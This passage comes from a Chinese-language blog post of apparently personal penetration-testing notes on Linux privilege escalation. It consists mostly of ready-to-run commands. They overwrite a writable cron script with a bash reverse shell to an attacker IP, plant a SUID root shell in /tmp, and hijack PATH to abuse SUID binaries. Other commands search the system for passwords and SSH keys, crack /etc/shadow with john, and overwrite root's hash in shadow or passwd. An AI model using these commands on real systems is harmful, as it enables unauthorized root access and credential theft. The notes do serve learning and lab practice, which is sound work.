+<p><font style="color:rgb(51, 51, 51);">ls -l &#x2F;etc&#x2F;cron*</font></p>
+<p><font style="color:rgb(51, 51, 51);">cat &#x2F;etc&#x2F;crontab</font></p>
+<h2 id="文件重写"><a href="#文件重写" class="headerlink" title="文件重写"></a><font style="color:rgb(51, 51, 51);">文件重写</font></h2><h3 id="1-查看system-wide-crontab的内容："><a href="#1-查看system-wide-crontab的内容：" class="headerlink" title="1.查看system-wide crontab的内容："></a><font style="color:rgb(36, 41, 47);">1.查看system-wide crontab的内容：</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./img/Cox7JkxS9VkQluZG/1763448548898-b32f3612-b75a-46f2-ad1c-b0223f883514-108120.png" alt="1763448548898-b32f3612-b75a-46f2-ad1c-b0223f883514.png"></p>
+<h3 id="2-在服务器上查找overwrite-sh-文件："><a href="#2-在服务器上查找overwrite-sh-文件：" class="headerlink" title="2.在服务器上查找overwrite.sh 文件："></a><font style="color:rgb(36, 41, 47);">2.在服务器上查找overwrite.sh 文件：</font></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate overwrite.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./img/Cox7JkxS9VkQluZG/1763448548984-a05ab778-3323-4fa6-b2aa-6f226624aee2-376859.png" alt="1763448548984-a05ab778-3323-4fa6-b2aa-6f226624aee2.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/overwrite.sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-检查文件的权限"><a href="#3-检查文件的权限" class="headerlink" title="3.检查文件的权限"></a><font style="color:rgb(36, 41, 47);">3.检查文件的权限</font></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /usr/local/bin/overwrite.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./img/Cox7JkxS9VkQluZG/1763448550415-ba11b062-4678-4b66-84f2-0fd630982498-565626.png" alt="1763448550415-ba11b062-4678-4b66-84f2-0fd630982498.png"></p>
+<p><font style="color:rgb(36, 41, 47);">注意：这个文件是可写的</font></p>
+<h3 id="4-将-overwrite-sh文件的内容替换为："><a href="#4-将-overwrite-sh文件的内容替换为：" class="headerlink" title="4.将 overwrite.sh文件的内容替换为："></a><font style="color:rgb(36, 41, 47);">4.将 overwrite.sh文件的内容替换为：</font></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash </span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">175.130</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/./img/Cox7JkxS9VkQluZG/1763448548976-b1f7fd36-ee5a-489f-a381-624848aba3a6-340053.png" alt="1763448548976-b1f7fd36-ee5a-489f-a381-624848aba3a6.png"></p>
+<h3 id="5-kali上运行nc"><a href="#5-kali上运行nc" class="headerlink" title="5.kali上运行nc"></a><font style="color:rgb(36, 41, 47);">5.kali上运行nc</font></h3><p><font style="color:rgb(36, 41, 47);">等待 cron jobs运行，返回root权限</font></p>
+<p><font style="color:rgb(36, 41, 47);"></font></p>
+<h2 id="环境变量劫持"><a href="#环境变量劫持" class="headerlink" title="环境变量劫持"></a>环境变量劫持</h2><h3 id="查看定时任务："><a href="#查看定时任务：" class="headerlink" title="查看定时任务："></a><font style="color:rgb(85, 85, 85);">查看定时任务：</font></h3><p><img src="/./img/Cox7JkxS9VkQluZG/1763449838343-fbced33d-5ec3-4b0a-954d-f77facd25f00-550418.png" alt="1763449838343-fbced33d-5ec3-4b0a-954d-f77facd25f00.png"></p>
+<p><font style="color:rgb(85, 85, 85);">发现定义了诸多环境变量，如果其任务有 未指定绝对路径的指令，如</font></p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">17 </span>*    * * *   root    <span class="keyword">shell</span>.sh</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(85, 85, 85);">而且我们在其环境变量路径中可以进行写入操作，那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持。</font></p>
+<p><font style="color:rgb(85, 85, 85);">比如在 &#x2F;sbin 写入一个 反弹 shell 功能的 shell.sh，那么就可以造成提权。</font></p>
+<h3 id="2-在-home-user-中创建文件-overwrite-sh，内容如下："><a href="#2-在-home-user-中创建文件-overwrite-sh，内容如下：" class="headerlink" title="2.在&#x2F;home&#x2F;user 中创建文件 overwrite.sh，内容如下："></a><font style="color:rgb(36, 41, 47);">2.在&#x2F;home&#x2F;user 中创建文件 overwrite.sh，内容如下：</font></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash </span></span><br><span class="line">cp /bin/bash /tmp/rootbash </span><br><span class="line">chmod +s /tmp/rootbash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./img/Cox7JkxS9VkQluZG/1763450254700-91306428-9a8b-418c-a51a-e6e49b16f187-374886.png" alt="1763450254700-91306428-9a8b-418c-a51a-e6e49b16f187.png"></p>
+<h3 id="3-加权"><a href="#3-加权" class="headerlink" title="3.加权"></a><font style="color:rgb(36, 41, 47);">3.加权</font></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x /home/user/overwrite.sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-等待cronjob运行（此作业尤其每分钟运行一次）。"><a href="#4-等待cronjob运行（此作业尤其每分钟运行一次）。" class="headerlink" title="4.等待cronjob运行（此作业尤其每分钟运行一次）。"></a><font style="color:rgb(36, 41, 47);">4.等待cronjob运行（此作业尤其每分钟运行一次）。</font></h3><h3 id="5-创建-tmp-rootbash文件"><a href="#5-创建-tmp-rootbash文件" class="headerlink" title="5.创建&#x2F;tmp&#x2F;rootbash文件"></a><font style="color:rgb(36, 41, 47);">5.创建&#x2F;tmp&#x2F;rootbash文件</font></h3><p><font style="color:rgb(36, 41, 47);">执行它，使用与-p保存有效的UID</font></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/rootbash –p</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./img/Cox7JkxS9VkQluZG/1763450254841-a7af9637-0737-4594-90da-ae6af1e1a529-340304.png" alt="1763450254841-a7af9637-0737-4594-90da-ae6af1e1a529.png"></p>
+<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/72965.html">https://www.secpulse.com/archives/72965.html</a></p>
+<h1 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h1><p>环境劫持需要的两个条件 存在带有suid的文件suid文件存在系统命令</p>
+<p>且这个文件中必须有系统命令，这样我们就可以命名一个和这个系统命令相同的文件写入&#x2F;bin&#x2F;bash；</p>
+<p>再将存放这个文件的路径加入环境变量中，当系统去执行这个带有系统命令的文件时；就会直接执行我们命名和这个系统命令相同的文件；而非真实的系统命令；从而实现劫持环境变量提权。</p>
+<h2 id="寻找suid"><a href="#寻找suid" class="headerlink" title="寻找suid"></a>寻找suid</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">假设发现 /usr/local/bin/restore 是 SUID-root，属主 root。</span><br></pre></td></tr></table></figure>
+
+<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings /usr/local/bin/restore | grep -E &#x27;^/(s?bin|usr)&#x27;</span><br><span class="line">或者运行一下这个，看看有什么</span><br></pre></td></tr></table></figure>
+
+<h2 id="劫持"><a href="#劫持" class="headerlink" title="劫持"></a>劫持</h2><p>假设<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">发现了 &#x2F;home&#x2F;lvxyz&#x2F;script&#x2F;demo</font></p>
+<p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">我们运行一下这个文件，发现它会执行 ps命令</font></p>
+<h3 id="1-echo"><a href="#1-echo" class="headerlink" title="1.echo"></a>1.echo</h3><p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">我们就往&#x2F;tmp写入 一个同名文件，内容为 &#x2F;bin&#x2F;bash</font></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/lvxyz/script</span><br><span class="line">./demo</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-cp"><a href="#2-cp" class="headerlink" title="2.cp"></a>2.cp</h3><p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">我们就往&#x2F;tmp写入 一个同名文件，内容为 &#x2F;bin&#x2F;bash</font></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">cp /bin/bash  /tmp/ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/lvxyz/script</span><br><span class="line">./demo</span><br></pre></td></tr></table></figure>
+
+<h1 id="密码提权"><a href="#密码提权" class="headerlink" title="密码提权"></a>密码提权</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">grep --color=auto -rnw &#x27;/&#x27; -ie &quot;PASSWORD&quot; --color=always 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line">find . -type f -exec grep -i -I &quot;PASSWORD&quot; &#123;&#125; /dev/null \;</span><br><span class="line"></span><br><span class="line">strings /dev/mem -n10 | grep -i PASS</span><br><span class="line"></span><br><span class="line">locate password | more</span><br><span class="line"></span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;</span><br><span class="line"></span><br><span class="line">find / -name authorized_keys 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line">find / -name id_rsa 2&gt; /dev/null</span><br></pre></td></tr></table></figure>
+
+<h2 id="一、可读shadow文件利用提权"><a href="#一、可读shadow文件利用提权" class="headerlink" title="一、可读shadow文件利用提权"></a>一、可读shadow文件利用提权</h2><p>ls-al &#x2F;etc&#x2F;shadow # 查看文件属性，确保当前用户对shadow文件具有可读权限</p>
+<p>cat &#x2F;etc&#x2F;shadow |grep’:$’# 查看shadow文件夹，grep相当于过滤器，后面接过滤条件</p>
+<p>在&#x2F;etc&#x2F;shadow文件中，每个用户的密码都是用一个特定的哈希函数加密的。为了避免密码被轻易破解，Linux 系统会使用不同的哈希函数来加密密码。而$y$中的y字符则表示使用的是哪种哈希函数，不同的哈希函数对应不同的字符。以下是一些常见的 $y$ 值及其对应的哈希函数：</p>
+<p>$1$表示使用的是 MD5 哈希函数；</p>
+<p>$2$或$2a$表示使用的是 Blowfish 哈希函数；</p>
+<p>$5$表示使用的是 SHA-256 哈希函数；</p>
+<p>$6$表示使用的是 SHA-512 哈希函数。</p>
+<p>sudo john –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt hash.txt # john进行破解</p>
+<h2 id="二、可写shadow文件利用提权"><a href="#二、可写shadow文件利用提权" class="headerlink" title="二、可写shadow文件利用提权"></a><font style="color:rgb(79, 79, 79);">二、可写shadow文件利用提权</font></h2><p>cp &#x2F;etc&#x2F;shadow &#x2F;tmp&#x2F;shadow.bak # 备份重要文件</p>
+<p>mkpasswd -m sha-512 123456# 生成hash，hash算法为sha-512</p>
+<h1 id="替换-etc-shadow中root的密码"><a href="#替换-etc-shadow中root的密码" class="headerlink" title="替换&#x2F;etc&#x2F;shadow中root的密码"></a>替换&#x2F;etc&#x2F;shadow中root的密码</h1><p><img src="/./img/Cox7JkxS9VkQluZG/1763469815533-443f9460-93b9-4ad6-851a-12cf3198e6ec-831672.png" alt="1763469815533-443f9460-93b9-4ad6-851a-12cf3198e6ec.png"></p>
+<h2 id="三、可写passwd文件利用提权"><a href="#三、可写passwd文件利用提权" class="headerlink" title="三、可写passwd文件利用提权"></a><font style="color:rgb(79, 79, 79);">三、可写passwd文件利用提权</font></h2><p>提权肯定最先关注root用户，现代的linux发行版中，密码hash都是存储在&#x2F;etc&#x2F;shadow中，&#x2F;etc&#x2F;passwd中并不直接存储密码hash，通常用X来占位，但是还是可以直接将密码写入&#x2F;etcpasswd中，尝试提权。也就是一个优先级的问题，先读取passwd，再读取shadow文件。</p>
+<p><font style="color:rgb(92, 99, 112);">cp &#x2F;etc&#x2F;passwd &#x2F;tmp&#x2F;passwd.bak # 备份文件 </font></p>
+<p><font style="color:rgb(92, 99, 112);">openssl passwd&lt;明文&gt;# openssl passwd生成密码的hash值</font></p>
+<p><font style="color:rgb(92, 99, 112);"># 替换&#x2F;etc&#x2F;passwd中的X</font></p>
+<p><img src="/./img/Cox7JkxS9VkQluZG/1763469882774-d43ecb36-8e67-4d06-b585-5927978cd005-451138.png" alt="1763469882774-d43ecb36-8e67-4d06-b585-5927978cd005.png"></p>
+<p><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">生成hash时，也可以用</font><code><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">mkpasswd</font></code><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">，但是passwd文件中生成hash时最好用</font><code><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">openssl passwd</font></code><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">，再shadow文件中生成hash用</font><code><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">mkpasswd</font></code><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">。</font></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/317">https://forum.butian.net/share/317</a></p>
+<h1 id="第三方服务"><a href="#第三方服务" class="headerlink" title="第三方服务"></a>第三方服务</h1><h2 id="NFS共享"><a href="#NFS共享" class="headerlink" title="NFS共享"></a>NFS共享</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kqdssheng/p/18310245#id1">https://www.cnblogs.com/kqdssheng/p/18310245#id1</a></p>
+<p><font style="color:rgb(77, 77, 77);">NFS（网络</font><font style="color:rgb(78, 161, 219) !important;">文件系统</font><font style="color:rgb(77, 77, 77);">）是一种在端口TCP&#x2F;UDP2049上运行的网络</font><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E5%8D%8F%E8%AE%AE&spm=1001.2101.3001.7020"><font style="color:rgb(252, 85, 49);">文件共享协议</font></a><font style="color:rgb(77, 77, 77);">，由服务器和客户端两个组件组成。NFS服务器上创建共享目录，可以通过网络与其他Linux客户端共享文件。获得权限的用户可以将文件添加到共享中，并与有权访问该目录的其他用户共享。</font></p>
+<p><font style="color:rgb(77, 77, 77);">默认情况下，每个NFS共享都会启用root_squash功能，以防止共享文件拥有root:root身份或特殊权限（即启用root_squash后，所有共享文件都会变成nobody:nogroup身份）。但是，如果启用了no_root_squash功能，文件可以以root身份存在，这就容易导致权限升级。</font></p>
+<h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p><a target="_blank" rel="noopener" href="https://www.geekby.site/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">https://www.geekby.site/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/</a></p>
+<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><h1 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h1><p>非必要情况，不建议使用，容易搞宕机</p>
+<blockquote>
+<p>更新: 2025-11-21 19:52:41<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/dz2i02fu8nsc37ui">https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/dz2i02fu8nsc37ui</a></p>
+</blockquote>
+</article>
+<div class="article-footer">
+
+</div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">bug_001</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%8F%90%E6%9D%83"><span class="toc-text">Linux提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="toc-text">操作系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-text">环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E6%9C%BA%E6%9C%8D%E5%8A%A1"><span class="toc-text">打印机服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%92%8C%E7%BE%A4%E7%BB%84"><span class="toc-text">用户和群组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E4%BF%A1%E6%81%AF"><span class="toc-text">用户权限信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%92%8C%E6%9C%8D%E5%8A%A1"><span class="toc-text">进程和服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E7%9A%84%E8%BD%AF%E4%BB%B6"><span class="toc-text">查看安装的软件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1-%E6%8F%92%E4%BB%B6"><span class="toc-text">服务&#x2F;插件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E6%97%A0%E6%98%8E%E6%96%87%E5%AD%98%E6%94%BE%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-text">有无明文存放用户密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E6%97%A0-ssh-%E7%A7%81%E9%92%A5"><span class="toc-text">有无 ssh 私钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%8E%E5%BD%93%E5%89%8D%E6%9C%BA%E5%99%A8%E9%80%9A%E4%BF%A1%E7%9A%84%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E6%88%96%E8%80%85%E4%B8%BB%E6%9C%BA"><span class="toc-text">查看与当前机器通信的其他用户或者主机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-text">日志文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-text">敏感文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%81%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-text">特殊的数据库、配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92%E5%BC%8Fshell"><span class="toc-text">交互式shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E8%BF%87%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-text">查看安装过的工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%AE%AF%E4%B8%8E%E7%BD%91%E7%BB%9C"><span class="toc-text">通讯与网络</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%89%E5%93%AA%E4%BA%9B-NIC%EF%BC%9F%E5%AE%83%E6%98%AF%E5%90%A6%E8%BF%9E%E6%8E%A5%E5%88%B0%E5%8F%A6%E4%B8%80%E4%B8%AA%E7%BD%91%E7%BB%9C%EF%BC%9F"><span class="toc-text">系统有哪些 NIC？它是否连接到另一个网络？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E8%AE%BE%E7%BD%AE%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E4%BD%A0%E8%83%BD%E4%BB%8E%E8%BF%99%E4%B8%AA%E7%BD%91%E7%BB%9C%E4%B8%AD%E6%89%BE%E5%88%B0%E4%BB%80%E4%B9%88%EF%BC%9FDHCP%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%9F%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%9F%E7%BD%91%E5%85%B3%EF%BC%9F"><span class="toc-text">网络配置设置是什么？你能从这个网络中找到什么？DHCP服务器？域名服务器？网关？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%98%E6%9C%89%E5%93%AA%E4%BA%9B%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E5%92%8C%E4%B8%BB%E6%9C%BA%E6%AD%A3%E5%9C%A8%E4%B8%8E%E7%B3%BB%E7%BB%9F%E9%80%9A%E4%BF%A1%EF%BC%9F"><span class="toc-text">还有哪些其他用户和主机正在与系统通信？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%93%E5%AD%98%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9FIP-%E5%92%8C-%E6%88%96-MAC-%E5%9C%B0%E5%9D%80"><span class="toc-text">缓存了什么？IP 和&#x2F;或 MAC 地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%AF%E8%83%BD%E5%90%97%EF%BC%9F%E8%83%BD%E7%9C%8B%E5%88%B0%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">数据包嗅探可能吗？能看到什么？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E6%8F%90%E6%9D%83SUID-GUID"><span class="toc-text">可提权SUID &amp;&amp; GUID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%8F%AF%E5%86%99-%E6%89%A7%E8%A1%8C%E7%9B%AE%E5%BD%95"><span class="toc-text">查看可写&#x2F;执行目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proc-%E7%9B%AE%E5%BD%95"><span class="toc-text">proc 目录</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%90%8E%E8%8E%B7%E5%8F%96%E6%A8%A1%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-text">反弹shell后获取模拟终端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bash-%E5%8F%8D%E5%BC%B9"><span class="toc-text">bash 反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bash-%E5%8F%8D%E5%BC%B9-shell-TCP"><span class="toc-text">Bash 反弹 shell TCP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bash-%E5%8F%8D%E5%BC%B9-shell-UDP"><span class="toc-text">Bash 反弹 shell UDP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Curl%E9%85%8D%E5%90%88Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Curl配合Bash反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NC%E5%8F%8D%E5%BC%B9"><span class="toc-text">NC反弹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crontab%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Crontab反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Profile%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Profile反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">MSF反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%84%9A%E6%9C%AC"><span class="toc-text">常见脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="toc-text">sudo提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%B0%9D%E8%AF%95"><span class="toc-text">初始尝试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E5%A3%B3%E9%80%83%E7%94%9F%E5%BA%8F%E5%88%97"><span class="toc-text">外壳逃生序列</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#01-git-%E6%8F%90%E6%9D%83"><span class="toc-text">01.git 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#02-find%E6%8F%90%E6%9D%83"><span class="toc-text">02.find提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#03-zip%E6%8F%90%E6%9D%83-%E6%A0%B8%E5%BF%83sudo%E6%B2%A1%E6%9C%89%E8%AF%A5%E5%91%BD%E4%BB%A4-%E5%A4%B1%E6%95%88"><span class="toc-text">03.zip提权( 核心sudo没有该命令,失效 )</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#04-awk-morpheus%E6%8F%90%E6%9D%83"><span class="toc-text">04.awk&#x2F;morpheus提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#05-less-more-%E6%8F%90%E6%9D%83"><span class="toc-text">05.less**&#x2F;more**提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#06-man%E6%8F%90%E6%9D%83"><span class="toc-text">06.man提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#07-env%E6%8F%90%E6%9D%83"><span class="toc-text">07.env提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#08-ed%E6%8F%90%E6%9D%83"><span class="toc-text">08.ed提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 